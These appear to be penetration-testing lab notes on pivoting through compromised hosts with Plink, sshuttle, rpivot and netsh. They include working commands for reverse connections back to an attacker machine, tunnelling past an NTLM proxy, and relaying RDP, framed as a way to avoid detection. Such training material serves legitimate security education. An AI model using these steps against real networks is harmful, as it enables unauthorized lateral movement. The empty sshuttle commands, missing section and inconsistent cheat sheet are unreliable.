## 1. Introduction

The earlier pivoting notes assumed a fairly clean setup: a Linux pivot host with SSH access or an existing Meterpreter session, and a Linux attack machine running `proxychains`. Real engagements are rarely that tidy. Sometimes the attack host is Windows. Sometimes the pivot host is Windows, not Linux. Sometimes there's no SSH access at all, or the network has an HTTP proxy with its own authentication sitting in the way. This section covers four tools built specifically to handle those messier, more obstacle-prone situations.

**Machine labels used throughout this section:**

| Label | Role |
|---|---|
| **HACKER** | Your own attack machine — Windows or Linux, depending on the example |
| **PIVOT** | The compromised machine bridging your network and the internal one — may be Linux (Ubuntu) or Windows depending on the section |
| **TARGET** | The final destination machine, reachable only through PIVOT |

## 2. SSH for Windows: Plink.exe

**Plink** ("PuTTY Link") is a command-line SSH client bundled with the PuTTY package — a toolset many Windows system administrators already have installed, going back to before Windows included its own native SSH client (which only arrived around Fall 2018). Just like the `ssh` command on Linux, Plink supports dynamic port forwarding and SOCKS proxy creation.

**Why this matters for pivoting:** imagine gaining access to a Windows machine that's moderately locked down. Pulling in your own unfamiliar tools risks getting noticed. But if PuTTY (and therefore Plink) already happens to be installed — or a copy can be found on a nearby file share — it becomes a ready-made, "living off the land" way to set up a pivot without introducing anything new to the environment. This is also simply the natural tool of choice whenever the attack host itself happens to be Windows rather than Linux.

**Starting a dynamic port forward from HACKER (Windows) through PIVOT (Ubuntu server):**
```
plink -ssh -D 9050 ubuntu@10.129.15.50
```
*This is functionally identical to the `ssh -D 9050` command from the earlier pivoting notes — `-ssh` specifies the protocol, and `-D 9050` requests dynamic port forwarding, opening a SOCKS listener on HACKER's local port 9050 once the SSH session to PIVOT is established.*

**Network flow:**
```
[HACKER] --- Plink SSH -D 9050 (SOCKS) ---> [PIVOT] ---> [TARGET]
[HACKER] <---------- relayed traffic ------- [PIVOT] <--- [TARGET]
```

**Routing an actual Windows application's traffic through that SOCKS proxy:** since `proxychains` isn't a Windows tool, a separate program called [Proxifier](https://www.proxifier.com/) fills that role instead. 
- Proxifier creates a "tunneled network" for ordinary desktop applications, letting them transparently operate through a SOCKS or HTTPS proxy — including chaining multiple proxies together.
- After configuring a Proxifier profile pointed at `127.0.0.1:9050` (the SOCKS listener Plink just created), any application launched through that profile has its traffic routed over the SSH tunnel automatically — including `mstsc.exe`, Windows' own built-in Remote Desktop client, to open an RDP session with a target machine on the internal network.

## 3. SSH Pivoting with Sshuttle

[Sshuttle](https://github.com/sshuttle/sshuttle) is a Python-based tool that accomplishes something similar to dynamic SSH forwarding plus proxychains — but without needing proxychains at all. 
- Its key limitation: it only works over SSH, unlike proxychains, which can also route through Tor or HTTP/HTTPS proxies.
- Its key advantage: it automates the creation of `iptables` rules, meaning ordinary tools can be pointed at the pivoted network directly, with no per-tool proxy wrapping required.

**Step 1 — On HACKER: install sshuttle.**
```
$ sudo apt-get install sshuttle
```

**Step 2 — On HACKER: run sshuttle, specifying the pivot and the subnet to route through it.**
```

```
- `-r ubuntu@10.129.202.64` specifies the pivot host and login credentials, and `172.16.5.0/23` is the subnet that should be routed through it.
- Behind the scenes, sshuttle sets up local `iptables` ("nat" method) rules that transparently redirect any traffic destined for that subnet into a local TCP redirector (port 12300 here), which then tunnels it over SSH to PIVOT.
- All of this happens automatically — there's no separate proxychains configuration step required, unlike the dynamic forwarding approach in earlier notes.

**Network flow:**
```
[HACKER] --- sshuttle (SSH + iptables redirect) ---> [PIVOT] ---> [TARGET]
[HACKER] <------------- relayed traffic ------------ [PIVOT] <--- [TARGET]
```

**Step 3 — On HACKER: run a tool directly against the internal network — no proxychains wrapper needed.**

## 4. Web Server Pivoting with Rpivot

[Rpivot](https://github.com/klsecservices/rpivot) is a Python 2-based reverse SOCKS proxy tool. "Reverse" here describes the direction the connection is established: rather than HACKER reaching into the internal network, a machine *inside* that network connects *out* to HACKER, and that connection is then used to expose a SOCKS proxy on HACKER's side. This is particularly useful when the internal network restricts inbound connections but allows outbound ones.

**Scenario:** an internal web server sits at `172.16.5.135`, reachable only from within the internal network. PIVOT has a presence on that network and can reach it; HACKER cannot, directly.

**Step 1 — On HACKER: get a copy of rpivot.**
```
$ git clone https://github.com/klsecservices/rpivot.git
```

**Step 2 — On HACKER: start rpivot's server component.**
```
$ python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
- `--server-port 9999` is the port PIVOT's rpivot client will connect back to.
- `--proxy-port 9050` is where the resulting SOCKS proxy will actually be exposed on HACKER, ready for `proxychains` to use.
- `--server-ip 0.0.0.0` means listen on all of HACKER's network interfaces.

**Step 3 — On HACKER: copy rpivot onto PIVOT.**
```
$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
*`-r` recursively copies the entire rpivot folder, since it's a small application rather than a single file.*

**Step 4 — On PIVOT: run rpivot's client component, connecting back to HACKER.**
```
ubuntu@WEB01:~/rpivot$ python2 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```
*This is the "reverse" part — PIVOT, not HACKER, initiates this connection, reaching out to HACKER's rpivot server on port 9999.*

**Confirming the connection on HACKER's side:**
```
New connection from host 10.129.202.64, source port 35226
```

**Network flow:**
```
[HACKER] <--- rpivot client.py "backconnect" --- [PIVOT] ---> [TARGET webserver]
[HACKER] --- SOCKS proxy (port 9050) traffic ---> [PIVOT] <--- [TARGET webserver]
```

**Step 5 — On HACKER: point proxychains at the SOCKS proxy rpivot exposed, then browse to the internal web server.**
```
proxychains firefox-esr 172.16.5.135:80
```
*(As with earlier notes, this assumes `/etc/proxychains.conf` has already been updated to point at `127.0.0.1:9050`, the port specified in Step 2.) This opens the internal web server — which HACKER has no direct route to — inside a regular Firefox window, entirely routed through PIVOT's reverse connection.*

**Handling an HTTP proxy with NTLM authentication in the way:** some organizations place an authenticating HTTP proxy (tied to the Domain Controller via NTLM) between internal hosts and the outside world. Rpivot's client supports authenticating through exactly this kind of proxy directly:
```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
*The `--ntlm-proxy-*` options and `--domain`/`--username`/`--password` let rpivot's client authenticate to that NTLM proxy on its own, rather than failing to get out at all.*

## 5. Port Forwarding with Windows Netsh

[Netsh](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh) is a built-in Windows command-line tool for managing network configuration — finding routes, viewing firewall settings, adding proxies, and, relevantly here, creating port forwarding rules. Unlike Plink or rpivot, nothing extra needs to be installed at all — Netsh already ships with every copy of Windows.

**Scenario:** the compromised host this time is itself a Windows machine — specifically, an IT admin's workstation (`10.129.15.150` / `172.16.5.19`). Gaining this kind of access through phishing or other social engineering is a realistic way such a foothold might occur, and it opens up further pivoting from inside the network that workstation belongs to.

**Setting up the port forward on the Windows PIVOT:**
```
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```
- `interface portproxy add v4tov4` creates an IPv4-to-IPv4 forwarding rule.
- `listenport=8080` and `listenaddress=10.129.15.150` define where the rule listens — on PIVOT's own externally-reachable address, port 8080.
- `connectport=3389` and `connectaddress=172.16.5.25` define where to forward matching traffic to — RDP (port 3389) on a different internal host entirely, at `172.16.5.25`. This single rule effectively turns PIVOT's port 8080 into a direct relay to that other internal machine's RDP service.

**Verifying the rule took effect:**
```
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.15.150   8080        172.16.5.25     3389
```

**Network flow:**
```
[HACKER] --- xfreerdp to PIVOT:8080 ---> [PIVOT] --- netsh portproxy ---> [TARGET (172.16.5.25):3389]
[HACKER] <------------ RDP session data ------------- [PIVOT] <------------- [TARGET]
```

**Connecting from HACKER:**
Once the rule is in place, pointing `xfreerdp` (or any RDP client) at PIVOT's address on port 8080 gets transparently routed by Netsh to the actual RDP target at `172.16.5.25:3389` — no further configuration, SOCKS proxy, or proxychains setup needed on HACKER's side at all, since Netsh does the relaying entirely on PIVOT.

## 7. Cheat Sheet

| Goal | Tool | Run on | Key Command |
|---|---|---|---|
| Dynamic SOCKS forward (Windows attack host) | Plink | HACKER | `plink -ssh -D 9050 user@pivot` |
| Route a Windows GUI app through that SOCKS proxy | Proxifier | HACKER | Configure a Proxifier profile for `127.0.0.1:9050` |
| Install sshuttle | sshuttle | PIVOT | `sudo apt-get install sshuttle` |
| Route a subnet through SSH, no proxychains | sshuttle | HACKER | `sudo sshuttle -r user@pivot_ip SUBNET/CIDR -v` |
| Clone rpivot | rpivot | HACKER | `git clone https://github.com/klsecservices/rpivot.git` |
| Start rpivot's server (exposes SOCKS proxy) | rpivot | HACKER | `python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` |
| Copy rpivot to the pivot host | scp | HACKER | `scp -r rpivot user@pivot_ip:/home/user/` |
| Start rpivot's client (reverse connect) | rpivot | PIVOT | `python2 client.py --server-ip hacker_ip --server-port 9999` |
| Browse an internal site via rpivot's SOCKS proxy | proxychains | HACKER | `proxychains firefox-esr internal_ip:port` |
| Connect rpivot client through an NTLM proxy | rpivot | PIVOT | `python client.py --server-ip IP --server-port PORT --ntlm-proxy-ip IP --ntlm-proxy-port PORT --domain DOMAIN --username USER --password PASS` |

| Verify a Netsh port forward | netsh | Windows PIVOT | `netsh.exe interface portproxy show v4tov4` |

## 8. Big-Picture Takeaways

1. **Every tool in this section solves the "wrong platform or wrong direction" problem.** Plink exists because the attack host (or pivot) might be Windows, not Linux; sshuttle exists to remove the proxychains dependency; rpivot exists for when the internal network only allows outbound connections; netsh exists for when nothing at all can be installed on the pivot.
2. **"Living off the land" applies to pivoting tools just as much as file transfer tools.** Plink (via PuTTY) and Netsh are both either already installed or native to Windows — reinforcing the same theme from the earlier LOLBAS/GTFOBins notes: using what's already present reduces the chance of being noticed.
3. **"Reverse" pivoting mirrors reverse shells for the same underlying reason.** Rpivot's server-waits/client-connects-out model exists for exactly the same network-restriction reasons that reverse shells are often preferred over bind shells — outbound connections are far more commonly allowed than inbound ones.
4. **Automation trades a small amount of flexibility for a lot of convenience.** Sshuttle's automatic `iptables` management means no per-tool proxychains wrapping — but it only works over SSH, unlike proxychains, which can also route through Tor or HTTP/HTTPS proxies when SSH specifically isn't the available path.
5. **Authentication obstacles need their own specific handling.** An NTLM-authenticating HTTP proxy would silently block a naive connection attempt — rpivot's built-in `--ntlm-proxy-*` support exists specifically to get past that particular, fairly common corporate obstacle.
6. **Netsh shows that a full pivoting toolkit isn't always necessary.** A single built-in command can relay a specific service (like RDP) through a Windows pivot host, with zero additional software — a good reminder to check what's already available before reaching for an external tool.
